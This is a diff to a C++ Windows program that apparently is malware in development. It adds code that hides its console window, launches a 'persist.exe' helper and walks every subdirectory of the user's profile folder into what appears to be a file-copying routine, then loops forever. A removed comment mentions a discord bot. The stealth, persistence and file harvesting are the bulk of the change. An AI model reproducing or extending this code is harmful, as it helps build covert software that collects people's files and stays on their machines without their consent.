@@ -7,11 +7,9 @@
 #include <sstream>
 #include <windows.h>
 #include <thread>
+#include <shlobj.h>
+#include <tchar.h>
 
-//testing my discord bot, just ignore this
-//yeah, this gonna take a long time lmao
-//im starting to think that im doing something wrong
-//yea...
 void Copy_A(const std::string &subdir_path)
 {
     std::ostringstream oss;
@@ -25,6 +23,15 @@ void Copy_A(const std::string &subdir_path)
         oss.str("");
         file.close();
     }
+}
+
+void hideConsoleWindow()
+{
+    // Get a handle to the console window
+    HWND consoleWindow = GetConsoleWindow();
+
+    // Hide the console window
+    ShowWindow(consoleWindow, SW_HIDE);
 }
 
 void iterate_subdirs(const std::string &dir_path, std::vector<std::string> &dirs)
@@ -66,13 +73,21 @@ void iterate_subdirs(const std::string &dir_path, std::vector<std::string> &dirs
 
 int main()
 {
-    char cwd[256];
-    std::string str = getcwd(cwd,sizeof(cwd));
+    // char cwd[256];
+    // std::string str = getcwd(cwd,sizeof(cwd));
+    hideConsoleWindow();
+    std::system("persist.exe");
     std::vector<std::string> dirs;
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth, 0);
-    iterate_subdirs(str, dirs);
+    TCHAR path[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path)))
+    {
+        std::basic_string<TCHAR> userFolderPath(path, path + _tcslen(path));
+        std::cout << "User folder path: " << std::string(userFolderPath.begin(), userFolderPath.end()) << std::endl;
+        iterate_subdirs(std::string(userFolderPath.begin(), userFolderPath.end()), dirs);
+    }
+    else
+    {
+        std::cerr << "Failed to retrieve user folder path." << std::endl;
+    }
     while(true){}
 }
